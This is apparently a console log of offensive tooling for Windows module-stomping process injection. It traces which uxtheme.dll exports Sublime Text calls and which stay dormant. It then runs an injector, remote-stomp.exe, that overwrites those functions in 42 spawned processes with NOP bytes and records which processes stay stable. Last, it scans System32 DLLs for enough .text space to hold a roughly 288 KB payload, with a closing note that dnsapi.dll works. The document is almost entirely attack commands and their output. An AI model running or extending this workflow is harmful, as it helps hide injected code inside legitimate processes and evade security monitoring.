c:\dev\windows-process-injection\module-stomping\api-monitoring>python api-monitor.py -m uxtheme.dll -p 652 -l c:\payloads\sublime-uxtheme-active.json
[*] Attaching to existing process PID: 652...
[*] Child Gating Status: DISABLED
[*] Targeted Evaluation Module: uxtheme.dll
[*] Destination Log Manifest: c:\payloads\sublime-uxtheme-active.json
[+] Successfully located uxtheme.dll. Instrumenting 85 exports...
[+] Successfully attached to running PID 652.
[*] Telemetry active. Press Ctrl+C to stop tracking.
================================================================================
[LOGGED] PID 652 -> OpenThemeData()
[LOGGED] PID 652 -> DrawThemeTextEx()
[LOGGED] PID 652 -> GetThemePartSize()
[LOGGED] PID 652 -> GetThemeInt()
[LOGGED] PID 652 -> GetThemeMargins()
[LOGGED] PID 652 -> GetThemeTextExtent()
[LOGGED] PID 652 -> GetThemeColor()
[LOGGED] PID 652 -> DrawThemeBackground()
[LOGGED] PID 652 -> IsThemeBackgroundPartiallyTransparent()
[LOGGED] PID 652 -> IsThemePartDefined()
[LOGGED] PID 652 -> DrawThemeText()
[LOGGED] PID 652 -> GetThemeSysFont()
[LOGGED] PID 652 -> CloseThemeData()
[LOGGED] PID 652 -> GetThemeAppProperties()
[LOGGED] PID 652 -> EnableThemeDialogTexture()
[LOGGED] PID 652 -> GetThemeFont()
[LOGGED] PID 652 -> GetThemeBool()
[LOGGED] PID 652 -> SetWindowTheme()
[LOGGED] PID 652 -> GetThemeBackgroundContentRect()
[LOGGED] PID 652 -> GetThemePosition()
[LOGGED] PID 652 -> GetThemeTextMetrics()
[LOGGED] PID 652 -> GetThemeBackgroundExtent()
[LOGGED] PID 652 -> IsCompositionActive()
[LOGGED] PID 652 -> IsAppThemed()
[LOGGED] PID 652 -> IsThemeActive()
[LOGGED] PID 652 -> OpenThemeDataForDpi()
[LOGGED] PID 652 -> BufferedPaintInit()
[LOGGED] PID 652 -> GetCurrentThemeName()
[LOGGED] PID 652 -> GetThemeMetric()
[LOGGED] PID 652 -> GetImmersiveUserColorSetPreference()
[LOGGED] PID 652 -> GetImmersiveColorFromColorSetEx()
[LOGGED] PID 652 -> BeginBufferedPaint()
[LOGGED] PID 652 -> DrawThemeBackgroundEx()
[LOGGED] PID 652 -> GetBufferedPaintDC()
[LOGGED] PID 652 -> GetBufferedPaintTargetDC()
[LOGGED] PID 652 -> EndBufferedPaint()
[LOGGED] PID 652 -> BufferedPaintRenderAnimation()
[LOGGED] PID 652 -> BeginBufferedAnimation()
[LOGGED] PID 652 -> DrawThemeParentBackgroundEx()
[LOGGED] PID 652 -> EndBufferedAnimation()
[LOGGED] PID 652 -> DrawThemeParentBackground()
[LOGGED] PID 652 -> BufferedPaintClear()
[LOGGED] PID 652 -> BufferedPaintStopAllAnimations()
[LOGGED] PID 652 -> BufferedPaintUnInit()

[*] Terminating telemetry loop.

c:\dev\windows-process-injection\module-stomping\api-monitoring>


c:\dev\windows-process-injection\module-stomping\api-monitoring>python find-dormant-exports.py -m c:\payloads\uxtheme-master-names.txt -t c:\payloads\sublime-uxtheme-active.json -o c:\payloads\sublime-dormant-uxtheme.txt -d c:\windows\system32\uxtheme.dll -p "C:\Program Files\Sublime Text\sublime_text.exe"
[*] Extracting PE structural metrics from: c:\windows\system32\uxtheme.dll
[+] Total .text section footprint: 430080 bytes.
[+] Exception unwind table records: 1857 items.
[+] Isolated 41 completely dormant functions.
[+] Complete structural CSV written to: c:\payloads\sublime-dormant-uxtheme.txt

c:\dev\windows-process-injection\module-stomping\api-monitoring>


c:\dev\windows-process-injection\module-stomping\api-monitoring>cd ..

c:\dev\windows-process-injection\module-stomping>cd stability-harness

c:\dev\windows-process-injection\module-stomping\stability-harness>

c:\dev\windows-process-injection\module-stomping\stability-harness>python make-stability-plan.py -i c:\payloads\sublime-dormant-uxtheme.txt -o c:\payloads\sublime-dormant-uxtheme-testing.json -s c:\dev\windows-process-injection\module-stomping\remote-stomp.exe -t 60
Success! Generated 42 campaigns in the stability plan.

c:\dev\windows-process-injection\module-stomping\stability-harness>


c:\dev\windows-process-injection\module-stomping\stability-harness>python stability-harness.py -p c:\payloads\sublime-dormant-uxtheme-testing.json -l c:\payloads\sublime-dormant-uxtheme-results.json
[*] Initializing Process Stability Campaign with 42 profiles.
================================================================================
[-] Executing Profile 1/42: sublime_text.exe
    [+] Spawned target process host with PID: 6232
    [+] Executing companion tool: c:\dev\windows-process-injection\module-stomping\remote-stomp.exe -p 6232 -d uxtheme.dll -s 430080 -n
    [*] Monitoring stability layout for 60s maximum...
[INFO] Neither function (-f) nor offset (-o) specified. Defaulting to base of .text section.
[*] NOP mode active. Generating 430080 bytes of NOP alignment data.
[*] Running PI with target PID: 6232
[*] Successfully opened handle to PID: 6232
[*] Target PEB located at: : 0x00000004f1fbf000
[*] Attempting to locate the module base for uxtheme.dll.
[*] Target DLL base located at: : 0x00007ff955d40000
[*] No function or offset specified. Locating absolute start of .text section.
[*] Target address resolved to: 0x00007ff955d41000
[*] Writing to buffer.
[*] Skipping thread creation (NOP testing mode complete).
[*] Process injection operation complete.
    [!] Result: Finished with abnormal return code: 2147483651
[-] Executing Profile 2/42: sublime_text.exe
    [+] Spawned target process host with PID: 3560
    [+] Executing companion tool: c:\dev\windows-process-injection\module-stomping\remote-stomp.exe -p 3560 -d uxtheme.dll -f BeginPanningFeedback -s 64 -n
    [*] Monitoring stability layout for 60s maximum...
[*] NOP mode active. Generating 64 bytes of NOP alignment data.
[*] Running PI with target PID: 3560
[*] Successfully opened handle to PID: 3560
[*] Target PEB located at: : 0x000000b9bf001000
[*] Attempting to locate the module base for uxtheme.dll.
[*] Target DLL base located at: : 0x00007ff955d40000
[*] Attempting to locate function: BeginPanningFeedback
[*] Target uxtheme.dll!BeginPanningFeedback located at: 0x00007ff955d9cbd0
[*] Writing to buffer.
[*] Skipping thread creation (NOP testing mode complete).
[*] Process injection operation complete.
    [+] Result: Process maintained stability for full 60s.
[-] Executing Profile 3/42: sublime_text.exe
    [+] Spawned target process host with PID: 488
    [+] Executing companion tool: c:\dev\windows-process-injection\module-stomping\remote-stomp.exe -p 488 -d uxtheme.dll -f BufferedPaintSetAlpha -s 133 -n
    [*] Monitoring stability layout for 60s maximum...
[*] NOP mode active. Generating 133 bytes of NOP alignment data.
[*] Running PI with target PID: 488
[*] Successfully opened handle to PID: 488
[*] Target PEB located at: : 0x000000e44a50b000
[*] Attempting to locate the module base for uxtheme.dll.
[*] Target DLL base located at: : 0x00007ff955d40000
[*] Attempting to locate function: BufferedPaintSetAlpha
[*] Target uxtheme.dll!BufferedPaintSetAlpha located at: 0x00007ff955d75c20
[*] Writing to buffer.
[*] Skipping thread creation (NOP testing mode complete).
[*] Process injection operation complete.
    [+] Result: Process maintained stability for full 60s.
[-] Executing Profile 4/42: sublime_text.exe
    [+] Spawned target process host with PID: 6792
    [+] Executing companion tool: c:\dev\windows-process-injection\module-stomping\remote-stomp.exe -p 6792 -d uxtheme.dll -f DllCanUnloadNow -s 129 -n
    [*] Monitoring stability layout for 60s maximum...
[*] NOP mode active. Generating 129 bytes of NOP alignment data.
[*] Running PI with target PID: 6792
[*] Successfully opened handle to PID: 6792
[*] Target PEB located at: : 0x0000006f26823000
[*] Attempting to locate the module base for uxtheme.dll.
[*] Target DLL base located at: : 0x00007ff955d40000
[*] Attempting to locate function: DllCanUnloadNow
[*] Target uxtheme.dll!DllCanUnloadNow located at: 0x00007ff955d95a50
[*] Writing to buffer.
[*] Skipping thread creation (NOP testing mode complete).
[*] Process injection operation complete.
    [+] Result: Process maintained stability for full 60s.
[-] Executing Profile 5/42: sublime_text.exe
    [+] Spawned target process host with PID: 5084
    [+] Executing companion tool: c:\dev\windows-process-injection\module-stomping\remote-stomp.exe -p 5084 -d uxtheme.dll -f DllGetActivationFactory -s 134 -n
    [*] Monitoring stability layout for 60s maximum...
[*] NOP mode active. Generating 134 bytes of NOP alignment data.
[*] Running PI with target PID: 5084
[*] Successfully opened handle to PID: 5084
[*] Target PEB located at: : 0x000000de4f0a7000
[*] Attempting to locate the module base for uxtheme.dll.
[*] Target DLL base located at: : 0x00007ff955d40000
[*] Attempting to locate function: DllGetActivationFactory
[*] Target uxtheme.dll!DllGetActivationFactory located at: 0x00007ff955d95ae0
[*] Writing to buffer.
[*] Skipping thread creation (NOP testing mode complete).
[*] Process injection operation complete.
    [+] Result: Process maintained stability for full 60s.
...
[-] Executing Profile 42/42: sublime_text.exe
    [+] Spawned target process host with PID: 7432
    [+] Executing companion tool: c:\dev\windows-process-injection\module-stomping\remote-stomp.exe -p 7432 -d uxtheme.dll -f UpdatePanningFeedback -s 64 -n
    [*] Monitoring stability layout for 60s maximum...
[*] NOP mode active. Generating 64 bytes of NOP alignment data.
[*] Running PI with target PID: 7432
[*] Successfully opened handle to PID: 7432
[*] Target PEB located at: : 0x000000742b5c0000
[*] Attempting to locate the module base for uxtheme.dll.
[*] Target DLL base located at: : 0x00007ff955d40000
[*] Attempting to locate function: UpdatePanningFeedback
[*] Target uxtheme.dll!UpdatePanningFeedback located at: 0x00007ff955d90190
[*] Writing to buffer.
[*] Skipping thread creation (NOP testing mode complete).
[*] Process injection operation complete.
    [+] Result: Process maintained stability for full 60s.

c:\dev\windows-process-injection\module-stomping\stability-harness>



----------------


c:\dev\windows-process-injection\module-stomping>python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\sublime-loaded-list.txt 287929
[*] Loading INCLUDE_MODULES from: 'c:\payloads\sublime-loaded-list.txt'
[+] Loaded 64 modules into INCLUDE_MODULES filter.
[*] Scanning Target Directory: 'c:\Windows\System32'
[*] Filtering for Files      : > 1.0MB
[*] Required .text Space     : 0x464b9 bytes
[*] Targeted Include Filter  : Active (64 specific targets allowed)
--------------------------------------------------------------------------------------------------------------------------------------------
Full File Path                                                                        | File Size (MB)  | Size of .text   | Virtual Address
--------------------------------------------------------------------------------------------------------------------------------------------
c:\Windows\System32\combase.dll                                                       | 3.54            | 0x269ca2        | 0x1000
c:\Windows\System32\CoreMessaging.dll                                                 | 1.17            | 0xd1175         | 0x1000
c:\Windows\System32\CoreUIComponents.dll                                              | 2.89            | 0x19bf50        | 0x1000
c:\Windows\System32\crypt32.dll                                                       | 1.46            | 0x124e7b        | 0x1000
c:\Windows\System32\dcomp.dll                                                         | 2.15            | 0x19280c        | 0x1000
c:\Windows\System32\dnsapi.dll                                                        | 1.18            | 0xc64cc         | 0x1000
c:\Windows\System32\DWrite.dll                                                        | 2.37            | 0x192c3c        | 0x1000
c:\Windows\System32\gdi32full.dll                                                     | 1.18            | 0xb32bc         | 0x1000
c:\Windows\System32\KernelBase.dll                                                    | 3.94            | 0x1a392f        | 0x1000
c:\Windows\System32\msctf.dll                                                         | 1.38            | 0x114f70        | 0x1000
c:\Windows\System32\ntdll.dll                                                         | 2.41            | 0x16ae9c        | 0x1000
c:\Windows\System32\ole32.dll                                                         | 1.61            | 0xd5c4c         | 0x1000
c:\Windows\System32\rpcrt4.dll                                                        | 1.11            | 0xd3e99         | 0x1000
c:\Windows\System32\shell32.dll                                                       | 7.37            | 0x5aa034        | 0x1000
c:\Windows\System32\TextInputFramework.dll                                            | 1.30            | 0xf8d0c         | 0x1000
c:\Windows\System32\twinapi.appcore.dll                                               | 2.28            | 0x196efa        | 0x1000
c:\Windows\System32\ucrtbase.dll                                                      | 1.31            | 0xf5f61         | 0x1000
c:\Windows\System32\user32.dll                                                        | 1.79            | 0xa7fee         | 0x1000
c:\Windows\System32\windows.storage.dll                                               | 8.43            | 0x64cc4e        | 0x1000
c:\Windows\System32\wininet.dll                                                       | 2.55            | 0x1d598c        | 0x1000
c:\Windows\System32\WinTypes.dll                                                      | 1.43            | 0xa1318         | 0x1000
c:\Windows\System32\downlevel\ucrtbase.dll                                            | 1.31            | 0xf559c         | 0x1000
--------------------------------------------------------------------------------------------------------------------------------------------
[*] Found 22 potential candidates matching the criteria.

c:\dev\windows-process-injection\module-stomping>

WinTypes.dll            no spots
windows.storage.dll     no spots
rpcrt4.dll              no spots
gdi32full               no spots
dnsapi.dll              this works
